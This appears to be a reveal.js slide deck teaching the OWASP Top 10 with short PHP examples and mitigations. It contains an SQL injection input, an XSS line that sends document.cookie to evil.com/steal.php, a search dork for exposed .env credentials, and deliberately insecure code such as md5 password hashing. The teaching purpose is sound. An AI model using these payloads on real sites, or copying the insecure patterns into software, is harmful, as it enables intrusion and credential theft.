@@ -1,0 +1,386 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+
+    <title>OWASP Top 10 PHP Examples</title>
+
+    <meta name="description" content="PHP Examples for the OWASP Top 10">
+    <meta name="author" content="Markus Opolka">
+
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="stylesheet" href="css/reset.css">
+    <link rel="stylesheet" href="css/reveal.css">
+    <link rel="stylesheet" href="css/theme/black.css" id="theme">
+
+    <!-- Theme used for syntax highlighting of code -->
+    <link rel="stylesheet" href="lib/css/monokai.css">
+
+    <!-- Printing and PDF exports -->
+    <script>
+      var link = document.createElement( 'link' );
+      link.rel = 'stylesheet';
+      link.type = 'text/css';
+      link.href = window.location.search.match( /print-pdf/gi ) ? 'css/print/pdf.css' : 'css/print/paper.css';
+      document.getElementsByTagName( 'head' )[0].appendChild( link );
+    </script>
+
+    <!--[if lt IE 9]>
+    <script src="lib/js/html5shiv.js"></script>
+    <![endif]-->
+ </head>
+  <body>
+    <div class="reveal">
+      <div class="slides">
+        <section>
+          <h1>OWASP Top 10</h1>
+          <h3>With simple PHP examples</h3>
+          <p>
+            <small>Created by <a href="https://martialblog.de">Markus Opolka</a></small>
+          </p>
+        </section>
+
+        <section>
+          <h2>Introduction</h2>
+          <p>The OWASP is a nonprofit foundation that works to improve the security of software.</p>
+          <p>The Top 10 focuses on identifying the most serious web application security risks.</p>
+        </section>
+
+        <section>
+          <h2>Application Security Risks</h2>
+          <p><img data-src="images/Risks.png" alt="Application Risks"></p>
+          <p>Each of these paths represents a risk that may, or may not, be serious enough to warrant attention.</p>
+        </section>
+
+        <section>
+          <section>
+            <h2>A1 - Injection</h2>
+            <p>Injection flaws occur when untrusted data is sent to an interpreter as part of a command or query.</p>
+	  </section>
+	  <section>
+	    <h2>A1 - Details</h2>
+	    <p>Injection vulnerabilities are often found in SQL, LDAP, XPath, NoSQL queries, OS commands, and XML parser.</p>
+            <p>Caused by user-supplied data not being validated, filtered, or sanitized.</p>
+	  </section>
+	  <section>
+	    <h2>A1 - Examples</h2>
+	    <p>SQL Injections use existing SQL commands to expose hidden data</p>
+	    <pre><code class="php" data-trim>
+                $result = mysql_query('
+                 SELECT * FROM users WHERE username="'.$_GET['username'].'"'
+                );
+                $_GET['username'] = " OR 1 OR username = "
+                // SELECT * FROM users
+                //  WHERE username = "" OR 1 OR username = ""
+	    </code></pre>
+	  </section>
+	  <section>
+	    <h2>A1 - Mitigation</h2>
+	    <p>Never trust any input.</p>
+            <p>Validate data as much as possible.</p>
+            <p>Use prepared statements with bound variables.</p>
+	    <pre><code class="php" data-trim>
+                $stmt = $dbh.prepare(
+                 "SELECT * FROM REGISTRY where name = ?"
+                );
+	    </code></pre>
+	  </section>
+	</section>
+
+	<section>
+          <section>
+	    <h2>A2 - Broken Authentication</h2>
+	    <p>Application functions related to authentication and session management are often implemented incorrectly.</p>
+          </section>
+	  <section>
+	    <h2>A2 - Details</h2>
+	    <p>Authentication-related attacks can come in many forms</p>
+	    <ul>
+	      <li>Brute force attacks</li>
+	      <li>Default and or weak passwords</li>
+	      <li>Plain text, encrypted, or weakly hashed passwords</li>
+	      <li>Session IDs in the URL</li>
+	      <li>Not properly handling session (rotation, invalidation)</li>
+	    </ul>
+	  </section>
+	  <section>
+	    <h2>A2 - Examples</h2>
+            <p>Session IDs in the URL and does not expire</p>
+	    <pre><code class="php" data-trim>
+                // http://xy.com/webshop;jsessionid=2P0OC2JSNDLPSKHCJUN2JV
+	    </code></pre>
+          </section>
+	  <section>
+	    <h2>A2 - Mitigation</h2>
+            <p>Depends on the weakness.</p>
+            <p>Do not deploy any default credentials.</p>
+            <p>Limit failed login attempts.</p>
+            <p>Use secure session managers.</p>
+          </section>
+        </section>
+
+	<section>
+          <section>
+	    <h2>A3 - Sensitive Data Exposure</h2>
+	    <p>Many web applications and APIs do not properly protect sensitive data.</p>
+            <p>The most common flaw is simply not encrypting sensitive data.</p>
+          </section>
+	  <section>
+	    <h2>A3 - Details</h2>
+            <p>Rather than directly attacking crypto, attackers steal keys, execute man-in-the-middle attacks, or steal clear text data off the server, while in transit, or from the user’s browser.</p>
+            <ul>
+              <li>The password database uses unsalted or simple hashes to store passwords.</li>
+              <li>A site doesn't use or enforce TLS or supports weak encryption.</li>
+            </ul>
+          </section>
+	  <section>
+	    <h2>A3 - Examples</h2>
+            <p>Unsecure password hash</p>
+	    <pre><code class="php" data-trim>
+                $hashed = md5($_POST["password"]);
+	    </code></pre>
+            <p>Sensitive data over unencrypted channel</p>
+	    <pre><code class="html" data-trim>
+                <form action="http://example.com/login.php" method="post">
+                  Password: <input type="password">
+                </form>
+	    </code></pre>
+          </section>
+	  <section>
+	    <h2>A3 - Mitigation</h2>
+            <p>Encrypt all data</p>
+            <p>Use secure protocols and algorithms</p>
+            <p>Do not cache sensitive data</p>
+          </section>
+	</section>
+
+	<section>
+          <section>
+	    <h2>A4 - XML External Entities (XXE)</h2>
+	    <p>Many older or poorly configured XML processors evaluate external entity references within XML documents.</p>
+	  </section>
+          <section>
+	    <h2>A4 - Mitigation</h2>
+            <p>Use less complex data formats such as JSON, and avoiding serialization of sensitive data.</p>
+            <p>Use updated XML libraries</p>
+            <p>Disable XML external entity and DTD processing</p>
+	  </section>
+	</section>
+
+	<section>
+	  <section>
+            <h2>A5 - Broken Access Control</h2>
+            <p>Restrictions on what authenticated users are allowed to do are often not properly enforced.</p>
+	  </section>
+	  <section>
+            <h2>A5 - Details</h2>
+            <p>Access control enforces policy such that users cannot act outside of their intended permissions. Failures typically lead to unauthorized information disclosure</p>
+	  </section>
+	  <section>
+            <h2>A5 - Examples</h2>
+            <p>Unverified account for data access</p>
+	    <pre><code class="php" data-trim>
+                pstmt.setString(1, request.getParameter("account"));
+                ResultSetresults = pstmt.executeQuery( );
+                // https://xy.com/app/accountInfo?acct=admin
+	    </code></pre>
+            <p>Unprotected URL are exposed</p>
+	    <pre><code class="php" data-trim>
+                // https://xy.com/app/webshop
+                // https://xy.com/app/admindashboard
+	    </code></pre>
+	  </section>
+	  <section>
+            <h2>A5 - Mitigation</h2>
+            <p>Deny access by default.</p>
+            <p>Implement strict access control mechanisms.</p>
+            <p>Invalidate session tokens after logout.</p>
+	  </section>
+
+	</section>
+
+	<section>
+	  <section>
+	    <h2>A6 - Security Misconfiguration</h2>
+	    <p>This is commonly a result of insecure default configurations, incomplete or ad hoc configurations, etc.</p>
+	  </section>
+	  <section>
+	    <h2>A6 - Details</h2>
+            <p>Misconfiguration can happen at any level of an application stack.</p>
+            <ul>
+              <li>Network or database services</li>
+              <li>Web or application server</li>
+              <li>Frameworks</li>
+              <li>Containers, VMs, Storage</li>
+            </ul>
+            <p>Attackers will exploit unpatched flaws or access default accounts, unprotected files and directories to gain unauthorized access or knowledge.</p>
+	  </section>
+	  <section>
+	    <h2>A6 - Examples</h2>
+            <p>Unprotected directory in web server:</p>
+	    <pre><code class="php" data-trim>
+                // online search for 'db_username filetype:env'
+	    </code></pre>
+            <p>Unsecure PHP configuration</p>
+	    <pre><code class="php" data-trim>
+                // expose_php = On
+                // safe_mode = Off
+                // register_globals = On
+	    </code></pre>
+	  </section>
+	  <section>
+	    <h2>A6 - Mitigation</h2>
+            <p>Review and update the configurations constantly</p>
+            <p>A minimal platform withoutany unnecessary features</p>
+            <p>An automated process to verify the configuration</p>
+	  </section>
+	</section>
+
+	<section>
+	  <section>
+	    <h2>A7 - Cross-Site Scripting (XSS)</h2>
+	    <p>XSS flaws occur whenever an application includes untrusted data in a new web page without proper validation or escaping.</p>
+            <p>XSS is the second most prevalent issue in the OWASP Top 10, and is found in around two-thirds of all applications</p>
+	  </section>
+	  <section>
+	    <h2>A7 - Details</h2>
+            <p>The application or API includes unvalidated and unescaped user input as part of HTML output.</p>
+            <p>A successful attack can allow the attacker to execute arbitrary HTML and JavaScript in the victim’s browser.</p>
+            <p>Typical XSS attacks include session stealing, account takeover, MFA bypass, DOM node replacement</p>
+	  </section>
+	  <section>
+	    <h2>A7 - Examples</h2>
+	    <pre><code class="php" data-trim>
+                $article = $pdo(SELECT * FROM articles WHERE id=2)
+                <div id="article">
+                  <?php echo $article['price']; ?>
+                </div>
+                // $article['price'] = window.open(
+                //   "evil.com/steal.php?cookie=" + document.cookie
+                // );
+	    </code></pre>
+	  </section>
+	  <section>
+	    <h2>A7 - Mitigation</h2>
+            <p>Escaping untrusted HTTP request data</p>
+            <p>Never Insert Untrusted Data Except in Allowed Locations</p>
+            <p>Use Frameworks that escape XSS</p>
+	  </section>
+	</section>
+
+	<section>
+          <section>
+	    <h2>A8 - Insecure Deserialization</h2>
+	    <p>Applications and APIs will be vulnerable if they deserialize hostile or tampered objects supplied by an attacker.</p>
+	  </section>
+	</section>
+
+	<section>
+	  <section>
+	    <h2>A9 - Using Components with Known Vulnerabilities</h2>
+	    <p>Using compromised components, such as libraries, frameworks, and other software modules, with the same privileges as the application.</p>
+	  </section>
+	  <section>
+	    <h2>A9 - Details</h2>
+            <p>These components can be at any level of an application stack.</p>
+            <ul>
+              <li>Web, Database or Application server</li>
+              <li>Frameworks and their dependencies</li>
+              <li>Containers, VMs, Storage</li>
+            </ul>
+	  </section>
+	  <section>
+	    <h2>A9 - Examples</h2>
+            <p>CVE-2017-9303, Laravel before 5.4.22 did not properly constrain the host portion of a password-reset URL.</p>
+            <p>CVE-2016-7479, Deserialization issue in all versions of PHP 7.</p>
+	  </section>
+	  <section>
+	    <h2>A9 - Mitigation</h2>
+            <p>Remove unused dependencies, unnecessary features, components and files.</p>
+            <p>Continuously monitor sources like CVE for all dependencies.</p>
+            <p>Monitor for libraries and components that are unmaintained.</p>
+            <p>Update components as soon as possible.</p>
+	  </section>
+        </section>
+
+	<section>
+	  <section>
+	    <h2>A9.1 - Open Source Supply Chain Attack</h2>
+            <p><small>(not an official OWASP Top 10)</small></p>
+            <p>Attackers can infiltrate the release process of components and are able to add malicous code.</p>
+            <p>These components can be at any level of an application stack.</p>
+            <p>A similar issue is domain/name squatting.</p>
+	  </section>
+	  <section>
+	    <h2>A9.1 - Examples</h2>
+            <p>CVE-2018-1000851 - An attacker added code to steal BitCoin</p>
+            <p>CVE-2019-15107 - An attacker added a command injection in Webmin </p>
+	  </section>
+	  <section>
+	    <h2>A9 - Mitigation</h2>
+            <p>Remove unused dependencies, unnecessary features, components and files.</p>
+            <p>Only obtain components from official sources. Use package signing.</p>
+            <p>Check changelogs or source code before updating.</p>
+            <p>Continuously monitor sources like CVE for all dependencies.</p>
+	  </section>
+	</section>
+
+	<section>
+	  <section>
+	    <h2>A10 - Insufficient Logging & Monitoring</h2>
+	    <p>Insufficient logging and monitoring, allows attackers to further attack systems.</p>
+	  </section>
+	  <section>
+	    <h2>A10 - Details</h2>
+            <p>Insufficient logging, detection, monitoring and active response can occur any time</p>
+            <ul>
+              <li>Events such as logins and failed logins</li>
+              <li>Application Errors and Warnings</li>
+            </ul>
+	  </section>
+	  <section>
+	    <h2>A10 - Mitigation</h2>
+            <p>Ensure login, access control failures, and server-side input validation failures can be logged.</p>
+            <p>Monitor for suspicious activities.</p>
+	  </section>
+	</section>
+
+	<section>
+	  <h2>Sources</h2>
+	  <ul>
+	    <li><a>https://owasp.org/www-project-top-ten/</a></li>
+	  </ul>
+	</section>
+
+      </div>
+    </div>
+
+    <script src="js/reveal.js"></script>
+
+    <script>
+      // More info https://github.com/hakimel/reveal.js#configuration
+      Reveal.initialize({
+	controls: true,
+	progress: true,
+	center: true,
+	hash: true,
+	transition: 'slide', // none/fade/slide/convex/concave/zoom
+	// More info https://github.com/hakimel/reveal.js#dependencies
+	dependencies: [
+	  { src: 'plugin/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+	  { src: 'plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+	  { src: 'plugin/highlight/highlight.js' },
+	  { src: 'plugin/search/search.js', async: true },
+	  { src: 'plugin/zoom-js/zoom.js', async: true },
+	  { src: 'plugin/notes/notes.js', async: true }
+	]
+      });
+
+    </script>
+
+  </body>
+</html>
